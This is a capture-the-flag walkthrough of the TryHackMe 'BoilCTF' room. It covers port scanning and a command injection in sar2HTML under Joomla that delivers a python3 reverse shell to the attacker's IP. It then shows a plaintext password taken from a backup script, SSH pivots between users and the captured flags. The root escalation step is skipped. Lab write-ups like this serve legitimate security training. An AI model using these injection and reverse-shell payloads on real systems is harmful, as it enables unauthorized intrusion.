# BoilCTF

![image](https://user-images.githubusercontent.com/5285547/131184044-2e213c40-b969-470d-9a02-3da66a370f5b.png)

Room link: https://tryhackme.com/room/boilerctf2

## Enumeration

nmap 

```
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
10000/tcp open  snet-sensor-mgmt (Webmin)
55007/tcp open  unknown (ssh)
```

## Joomla (Port 80)

http://10.10.155.54/joomla/

## sar2HTML

http://10.10.155.54/joomla/_test/index.php?plot=;ls

Then check the host tab

![image](https://user-images.githubusercontent.com/5285547/131186188-10992302-2519-4494-8b70-f5f59488f38e.png)

Rev shell (python3)

```
http://10.10.155.54/joomla/_test/index.php?plot=;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

10.8.153.120

http://10.10.86.171/joomla/_test/index.php?plot=;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.8.153.120",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

![image](https://user-images.githubusercontent.com/5285547/131186300-61cb4fbd-3a14-4ea0-8d50-6820d5782d28.png)

log.txt

![image](https://user-images.githubusercontent.com/5285547/131187008-13b7d16a-3c85-4816-8f7a-365dafe42717.png)

## SSH

```
ssh basterd@10.10.86.171 -p 55007
```

## stoner (user)

/home/basterd/backup.sh

```
*clip

TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
superduperp@$$no1knows

*clip
```

```
ssh stoner@IP -p 55007 
```

 * user.txt
  ```
  # cat .secret
  You made it till here, well done.
  ```

sudo -l

```
stoner@Vulnerable:~$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

* root.txt

```
# cat root.txt
It wasn't that hard, was it?
```

